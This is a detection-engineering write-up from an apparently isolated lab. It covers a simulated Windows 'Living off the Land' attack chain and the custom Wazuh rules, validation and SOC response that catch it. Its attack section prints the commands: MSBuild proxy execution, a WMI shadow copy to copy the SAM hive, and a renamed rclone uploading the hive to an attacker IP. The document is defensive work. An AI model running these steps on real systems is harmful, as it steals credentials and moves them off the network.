# DET-002 — Advanced LotL Credential Theft

## 1. Detection Overview

| Field | Value |
|---|---|
| Detection ID | DET-002 |
| Detection Name | Advanced LotL Credential Theft & Exfiltration |
| Platform | Windows 11 |
| Data Source | Sysmon (Event ID 1 & 3) |
| SIEM | Wazuh |
| Detection Type | Custom Wazuh Rules |
| Rule IDs | 100020, 100021, 100022, 100023 |
| Severity | Critical (12), High (10) |
| MITRE ATT&CK | T1127.001, T1003.002, T1047, T1036.005, T1567.002 |
| Status | Validated |

---

## 2. Detection Objective

Detect a multi-stage "Living off the Land" (LotL) attack chain utilizing trusted system binaries to bypass endpoint defenses.

The objective is to identify proxy execution via `MSBuild.exe`, unauthorized Volume Shadow Copy creation via WMI/CIM for SAM/SYSTEM hive extraction, and data exfiltration utilizing masqueraded third-party binaries (`rclone`).

---

## 3. Attack Scenario

A controlled adversary simulation was performed from the Kali Linux attacker machine against the Windows 11 target inside the isolated SentinelForge lab.

### Attacker

```text
Host: Kali Linux
IP: 10.10.10.40
Listening Service: Python HTTP Server (Port 8080)
```

## 4. Target
```text
Host: Windows 11 (DESKTOP-O58SQ9R)
IP: 10.10.10.10
Service: Sysmon
Account: DESKTOP-O58SQ9R\azadv
```

## 5. Attack Tools
Native Windows binaries and a masqueraded third-party synchronization tool were used to execute the attack chain.

Commands Used
```dos
# Phase 1: Defense Evasion
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Temp\malicious.xml

# Phase 2: Credential Access
powershell.exe -Command "Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\'}"
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam.save

# Phase 3: Exfiltration
cd C:\Temp\rclone-v1.75.1-windows-amd64
backup_service.exe copy C:\Temp\sam.save :webdav:exfil --webdav-url [http://10.10.10.40:8080](http://10.10.10.40:8080) --webdav-vendor other
```

## 6.Telemetry Flow
```text
Kali Linux (C2) / Windows 11 (Target)
    |
    | Attack execution
    v
Windows Sysmon
    |
    | Event ID 1 (Process) & 3 (Network) logs
    v
Wazuh Agent
    |
    | Log forwarding
    v
Wazuh Server
    |
    | Windows Eventchannel Decoder
    v
Sysmon Base Rules (sysmon_event1, sysmon_event3)
    |
    | Pattern matching
    v
Custom Rules (100020 - 100023)
    |
    v
Wazuh Alerts
    |
    v
SOC Analyst
```

## 7. Detection Logic
The custom rules correlate distinct phases of the attack chain using Sysmon telemetry.

Detection conditions:
```text
MSBuild spawning cmd/powershell
        =
Rule 100020 (Defense Evasion)

Command line contains "Win32_ShadowCopy"
        =
Rule 100021 (Credential Access)

Binary originalFileName is "rclone.exe"
        =
Rule 100022 (Masquerading / Exfiltration)

"backup_service.exe" connecting to Port 8080
        =
Rule 100023 (Network Exfiltration)
```
The detection utilizes Sysmon Event IDs 1 and 3 as the matching base events.

## 8.Custom Wazuh Rules
```xml
<group name="windows, sysmon, mitre_evasion, mitre_credential_access, mitre_exfiltration,">
    
    <!-- Phase 1: Defense Evasion -->
    <rule id="100020" level="12">
        <if_group>sysmon_event1</if_group>
        <field name="win.eventdata.parentImage" type="pcre2">(?i)MSBuild\.exe</field>
        <field name="win.eventdata.image" type="pcre2">(?i)(cmd\.exe|powershell\.exe)</field>
        <description>Custom Detection: MSBuild spawned a command shell (Potential Defense Evasion)</description>
        <mitre>
            <id>T1127.001</id>
        </mitre>
    </rule>

    <!-- Phase 2: Credential Access -->
    <rule id="100021" level="10">
        <if_group>sysmon_event1</if_group>
        <field name="win.eventdata.commandLine" type="pcre2">(?i)Win32_ShadowCopy</field>
        <description>Custom Detection: WMI/CIM creating volume shadow copy (Potential Credential Access)</description>
        <mitre>
            <id>T1003.002</id>
            <id>T1047</id>
        </mitre>
    </rule>

    <!-- Phase 3A: Execution/Masquerading -->
    <rule id="100022" level="12">
        <if_group>sysmon_event1</if_group>
        <field name="win.eventdata.originalFileName" type="pcre2">(?i)rclone\.exe</field>
        <description>Custom Detection: Rclone execution detected (Potential Data Exfiltration)</description>
        <mitre>
            <id>T1036.005</id>
            <id>T1567.002</id>
        </mitre>
    </rule>

    <!-- Phase 3B: Network Exfiltration -->
    <rule id="100023" level="12">
        <if_group>sysmon_event3</if_group>
        <field name="win.eventdata.image" type="pcre2">(?i)backup_service\.exe</field>
        <field name="win.eventdata.destinationPort">8080</field>
        <description>Custom Detection: Suspicious backup process initiated outbound network connection (Potential Exfiltration)</description>
        <mitre>
            <id>T1567.002</id>
        </mitre>
    </rule>
</group>
```
Rule Configuration
| Parameter | Value |
|---|---|
| Rule IDs | 100020, 100021, 100022, 100023 |
| Levels | 12, 10, 12, 12 |
| Base Condition | sysmon_event1, sysmon_event3 |
| Correlation | Process Trees, Command Line Args, Metadata, Ports |
| MITRE | T1127.001, T1003.002, T1047, T1036.005, T1567.002 |

## 9. Detection Validation & Evidence
The detection was validated using live attack telemetry.

### 9.1 Live Attack Validation
A multi-stage LotL attack simulation was executed against the Windows 11 target.
```text
Phase 1:
Rule ID: 100020 (Level 12)
Description: MSBuild spawned a command shell

Phase 2:
Rule ID: 100021 (Level 10)
Description: WMI/CIM creating volume shadow copy
Command Line: Invoke-CimMethod -ClassName Win32_ShadowCopy

Phase 3:
Rule ID: 100022 (Level 12)
Description: Rclone execution detected
Original File Name: rclone.exe

Rule ID: 100023 (Level 12)
Description: Suspicious backup process initiated outbound network connection
Destination IP: 10.10.10.40
Destination Port: 8080
```
### 9.2.Validation Result

```text
Raw Sysmon Events (EID 1 & 3)
      ↓
Windows Eventchannel Decoder ✓
      ↓
Sysmon Base Rules ✓
      ↓
Regex pattern matches on process/metadata/network ✓
      ↓
Custom Rules 100020 - 100023 ✓
      ↓
Level 10/12 Detections ✓
```
The detection logic was fully validated against live attack telemetry within OpenSearch Dashboards.

Evidence screenshots:

```Dashboards/screenshots/DET-002-wazuh-alert-100021.png```

```Dashboards/screenshots/DET-002-wazuh-alert-100023.png```

```Dashboards/screenshots/DET-002-LotL-Dashboard.png```

## 10. MITRE ATT&CK Mapping
Tactics
```text
Defense Evasion, Credential Access, Execution, Exfiltration
```
Twchniques
```text
T1127.001 — Trusted Developer Utilities Proxy Execution: MSBuild
T1003.002 — OS Credential Dumping: Security Account Manager
T1047 — Windows Management Instrumentation
T1036.005 — Masquerading: Match Legitimate Name or Location
T1567.002 — Exfiltration Over Web Service: Exfiltration to Cloud Storage
```
Rationale

The adversary utilized native development tools (MSBuild) to bypass execution restrictions, WMI to bypass file locks on registry hives, file renaming to obscure malicious tools, and web protocols to exfiltrate data off-network.

## 11. SOC Triage & Response
When these alerts are generated, a SOC analyst should investigate:

Source Process
```text
- Identify the parent process executing MSBuild or PowerShell.
- Check the execution path of the suspected binaries.
- Analyze the exact command-line arguments passed.
```
Target Artifacts
```text
- Verify if Volume Shadow Copies were created around the alert timestamp.
- Look for file creation events matching `.save`, `.bak`, or `.hive` extensions in staging directories (e.g., C:\Temp).
```
Network & Exfiltration
```text
- Check outbound network logs for the destination IP (10.10.10.40).
- Confirm the volume of data transferred over the TCP connection.
- Check if the binary's OriginalFileName metadata contradicts its current file name on disk.
```
Response

If the activity is confirmed as malicious:
```text
1. Isolate the target host from the network immediately.
2. Terminate the active malicious processes (MSBuild, PowerShell, renamed exfiltration tools).
3. Delete unauthorized Volume Shadow Copies and staged hive files.
4. Block the destination C2 IP at the perimeter firewall.
5. Initiate enterprise-wide password resets for all accounts cached on the compromised endpoint.
6. Conduct threat hunts across the network for similar OriginalFileName or Win32_ShadowCopy executions.
```

## 12. Detection Improvement
Future improvements to DET-002 could include:
```text
- Correlate Win32_ShadowCopy execution with immediate file read/copy events of SAM/SYSTEM files.
- Implement Windows Defender Application Control (WDAC) to strictly block MSBuild outside authorized paths.
- Create dynamic lists of known dual-use IT tools (rclone, mega, chisel) and alert on their OriginalFileName across the fleet.
- Deploy Wazuh active response scripts to automatically isolate the host network adapter upon triggering Level 12 exfiltration alerts.
```
### DET-002 Status
```text
ATTACK
   LotL Credential Theft & Exfiltration (MSBuild, WMI, Rclone)
TELEMETRY
   Sysmon Event ID 1 & Event ID 3
DECODING
   windows_eventchannel
BASE DETECTION
   sysmon_event1, sysmon_event3
CUSTOM DETECTION
   Rules 100020, 100021, 100022, 100023
CORRELATION
   Process execution, Command line args, File metadata, Network ports
ALERT
   Levels 10 and 12
MITRE
   T1127.001, T1003.002, T1047, T1036.005, T1567.002
LOGTEST
   Validated via live dashboard telemetry
STATUS
   VALIDATED
```
